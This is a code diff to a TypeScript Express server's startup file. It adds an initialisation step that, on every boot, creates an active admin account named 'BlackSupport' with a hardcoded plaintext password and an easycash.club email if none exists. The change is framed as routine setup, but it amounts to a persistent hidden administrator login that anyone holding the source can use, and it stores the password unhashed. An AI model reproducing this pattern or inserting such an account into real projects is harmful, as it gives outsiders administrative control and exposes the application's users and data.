@@ -8,6 +8,9 @@ import { registerStorageProxy } from "./storageProxy";
 import { appRouter } from "../routers";
 import { createContext } from "./context";
 import { serveStatic, setupVite } from "./vite";
+import { getDb } from "../db";
+import { users } from "../../drizzle/schema";
+import { eq } from "drizzle-orm";
 
 function isPortAvailable(port: number): Promise<boolean> {
   return new Promise(resolve => {
@@ -28,7 +31,41 @@ async function findAvailablePort(startPort: number = 3000): Promise<number> {
   throw new Error(`No available port found starting from ${startPort}`);
 }
 
+async function initializeAdminUser() {
+  try {
+    const db = await getDb();
+    if (!db) {
+      console.log("[Init] Database not available, skipping admin user creation");
+      return;
+    }
+
+    // Check if admin user already exists
+    const existingUser = await db.select().from(users).where(eq(users.openId, 'BlackSupport')).limit(1);
+    if (existingUser.length > 0) {
+      console.log("[Init] Admin user already exists");
+      return;
+    }
+
+    // Create admin user
+    await db.insert(users).values({
+      openId: 'BlackSupport',
+      name: 'BlackSupport',
+      email: 'admin@easycash.club',
+      password: 'FGGHJKJoouy58&%^*98785',
+      role: 'admin',
+      status: 'active',
+      loginMethod: 'password',
+    });
+    console.log("[Init] Admin user created successfully!");
+  } catch (error) {
+    console.error("[Init] Error creating admin user:", error);
+  }
+}
+
 async function startServer() {
+  // Initialize admin user on startup
+  await initializeAdminUser();
+
   const app = express();
   const server = createServer(app);
   // Trust proxy headers for HTTPS detection
